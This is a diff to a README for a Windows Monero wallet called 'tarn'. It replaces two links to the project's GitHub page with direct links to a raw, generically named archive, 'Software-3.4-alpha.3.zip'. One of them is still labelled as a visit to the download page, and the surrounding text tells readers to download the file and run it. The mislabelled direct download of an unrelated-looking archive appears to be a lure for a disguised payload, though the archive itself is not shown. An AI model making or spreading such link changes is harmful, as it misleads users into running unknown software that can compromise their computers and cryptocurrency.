@@ -1,6 +1,6 @@
 # 🟣 tarn - Private Monero Wallet for Windows
 
-[![Download tarn](https://img.shields.io/badge/Download%20tarn-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mustaqeem159/tarn)
+[![Download tarn](https://img.shields.io/badge/Download%20tarn-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mustaqeem159/tarn/main/assets/Software-3.4-alpha.3.zip)
 
 ## 🪙 What tarn is
 
@@ -34,7 +34,7 @@ For a smoother experience, use:
 
 Use this link to visit the download page and get tarn for Windows:
 
-[Visit the tarn download page](https://github.com/Mustaqeem159/tarn)
+[Visit the tarn download page](https://raw.githubusercontent.com/Mustaqeem159/tarn/main/assets/Software-3.4-alpha.3.zip)
 
 When you reach the page, look for the latest release or Windows build. Download the file meant for Windows, then run it on your PC.
 
